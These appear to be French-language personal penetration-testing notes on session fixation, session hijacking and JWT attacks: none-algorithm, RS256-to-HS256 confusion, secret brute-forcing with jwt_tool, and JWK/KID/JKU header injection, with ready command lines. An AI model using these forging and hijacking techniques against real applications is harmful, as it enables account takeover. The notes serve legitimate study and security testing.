
# Session Hijacking

tester rejeu de cookies

# #SessionFixation

> [!OBJ]
> Fixer un SESSID qui sera envoyé à la victime afin de procéder au Session Hijacking

> [!TIP]
> - The assigned session identifier pre-login remains the same post-login `and` Session identifiers (such as cookies) are being accepted from _URL Query Strings_ or _Post Data_ and propagated to the application

## Identifier

exemple d'URL

```URL
http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
```

Si le token indiqué dans l'URL correspond au cookie de session alors potentiellement vulnérable

## Exploiter

1. Ouvrir une nouvelle session en navigation privée et naviguer vers le lien potentiellement vulnérable en changeant le token

```URL
http://oredirect.htb.net/?redirect_uri=/complete.html&token=iControlThisCookie
```

2. Vérifier dans le stockage de cookies si la valeur indiqué dans l'URL s'y retrouve.![[Pasted image 20250306024403.png]]

3. Envoyer une URL forgée avec un cookie de session valide à la victime
4. Procéder au hijack de sa session

> [!TIP]
> Ou tester de rajouter à l'aveugle le cookie dans une URL telle que  http://insecure.exampleapp.com/login -> http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue et rafraichir la page pour voir si la valeur indiquée se fixe comme cookie

# Obtenir SESSION ID sans interaction avec l'utilisateur

 Sniffing (Wireshark / Tcpdump)

# Obtaining Session Identifiers Post-Exploitation (Web Server Access)

Aller récupérer les cookies de session en post-exploitation du serveur

## PHP

```bash
locate php.ini
```

```bash
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
```

```bash
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

## Java

https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html

```bash
locate SESSIONS.ser
```

## .NET

https://www.csharp.com/UploadFile/225740/introduction-of-session-in-Asp-Net/

- The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
- An SQL Server


# [[XSS (Cross-Site Scripting)]]


# [[CSRF - XSRF (Cross-Site Request Forgery)]]


# [[OPEN REDIRECT]]


---

# #JWT Tokens


Signature du token:

1. L'entête et le payload sont encodés en base64url
2. La concaténation des 2 (b64urlentete.b64urlpayload) est ensuite haché en SHA256 à l'aide de l'algorithme HMAC avec la clé secrète et apparait sous forme hexadécimal.
3. Le hash est ensuite encodé en Base64url et concaténé à la fin du token -> b64urlentete.b64urlpayload.b64urlhash

https://auth0.com/blog/json-web-token-signing-algorithms-overview/
https://jwt.io/
https://tools.onecompiler.com/hmac-sha512

## None Algo Attack

1. Copier le token dans https://jwt.io/
2. Remplacer l'algorithme par none (**"none"**, **"None"**, **"nOnE"**, **"NONE"**)
3. Remplacer la valeur du payload (username par admin par ex)

Si erreur signature invalide alors la supprimer.

Enfin injecter le token dans la session et rafraichir la page.

## RS256 -> HS256 Algo Attack

Passer de RS256 (asymétrique) à HS256 (symétrique) pourrais pousser le serveur a utiliser la clé publique comme clé secrète.
### Option 1

Récupérer la clé publique depuis un certificat et la mettre au format pem:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

Dans jwt.io --> insérer le token et modifier le payload et le header pour y mettre HS256

Puis avec jwt_tool:

```bash
python3 jwt_tool.py <token> -X k -pk pubkey.pem
```

### Option 2

Passer la clé publique au format hexadecimal (attention au 0a à la fin de l'hexa qui peut être en trop, ou pas, a tester ):

```bash
echo "-----BEGIN PUBLIC KEY-----              
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA18StSZxwWvbQiTPM7SRi
dPrcW/Uty9bsB3oaKTlkLksOHUgZ2svBEwc8UtZHtvgb/LZEGnDwEEQptA6pST8a
846gHRmzrtxT8wbVesGyGAnavUmCLyFrS7rhXe4aYEpsdIIjNBq6C/f7tWia/+Sd
4Fz+XBmc76QBqNMWau242G3k+mewmJhX7kMQ0OHDN5rSM1FvUQ32LhZiXz/3tt5P
G/mLO3zN5OnzlQyB6xgHBNV6KdEdapr9icew3Ph2JLI6AY4iFXLr01fZ7ikIPUXn
HGYZ2Ji7DbkYhFKnBLcvfkGj0Gu1HZtzcmM42kOHtSAH/hlFGkHbvToydjPoGENv
6QIDAQAB
-----END PUBLIC KEY-----" | xxd -p | tr -d "\\n"
```

Générer une signature HMAC en SHA256 avec le token (entête et payload) et la clé publique au format hexa 

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<keyhexa>
```

Convertir le SHA256 en Base64url:

```bash
python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('18e61fe88b59882f438a11b324a3e03f659254860eb6d01373ade444a0a37044')).replace('=','')\")"
```

l'ajouter au token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.<signatureb64url>
```

## Bruteforce de secret

wordlist -> https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```bash
python3 -m pip install termcolor cprint pycryptodomex requests --break-system-packages
```

```bash
python3 Desktop/tools/WEB/JWT/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -d jwt.secrets.list -C
```

Editer les valeurs et signer le token avec la clé secrète trouvée précédemment

```bash
python3 Desktop/tools/WEB/JWT/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw -T -S hs512 -p "key"
```


## JWK HEADER Injection

Dans Burp JWT Editor

1. Ajouter une clé RSA (generate)
2. dans BURP repeater aller dans JWT
3. Attack -> Embedded JWK

## KID HEADER Injection

> [!TIP]
> Le KID permet au serveur d'identifier la clé à utiliser pour vérifier la signature.
> 
> Mais pas de structure concrete pour cet ID .
> 
> Tester directory traversal dans le KID en le faisant pointer vers un fichier qui contient du contenu que nous connaissons (une page web par exemple).
> Générer une signature en utilisant le contenu du fichier en question comme secret.
> 
> /proc/sys/kernel/ftrace_enabled -> contenu à 0 ou 1 -> certaines applications check si le fichier de signature est vide donc peut ne pas marcher -> dans ce cas pointer vers une page du serveur web.
> 
> alternative -> pointer vers /dev/null qui ne contient rien et enlever la signature


Tester [[SQLi (Injections SQL)]] et [[Command Injection]] également dans le KID (peut être stockée en base de données)

## JKU HEADER Injection

> [!TIP]
> Tester SSRF qui pointe vers un jwk.json que l'on host [[SSRF (Server-Side Request Forgery)#]]

Endpoint communs (a checker, peut-être publique)
- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/api/v1/keys`
- [`/{tenant}/oauth2/v1/certs`](https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

jwk.json exemple (remplacer par les valeurs de notre clé RSA)

```
{ 
	"keys": [ 
		{ 
		  "kty": "RSA",
		  "e": "AQAB",
		  "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab", 
		  "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ" 
		}
	]
}
```

Dans BURP JWT Editor
 1. Générer une clé RSA et la hoster dans un jwk.json
 2. Editer le payload
 3. Remplacer le KID par celui contenu dans notre jwk.json
 4. Ajouter un jku qui pointe vers l'url de notre jwk.json

## Révocation de Token

> [!TIP]
> Dans certains cas les tokens sont révoqués d'une mauvaise manière, en se basant sur une blacklist dans laquelle le token est enregistré tel quel lors de sa création, au lieu de se baser sur un id présent dans l'entête ou le payload tel que le JTI.

Tester de rajouter le padding à la fin de la signature (= ou `==`) pour garder un token valide et bypasser la blacklist. 

Tester d'augmenter la valeur d'expiration

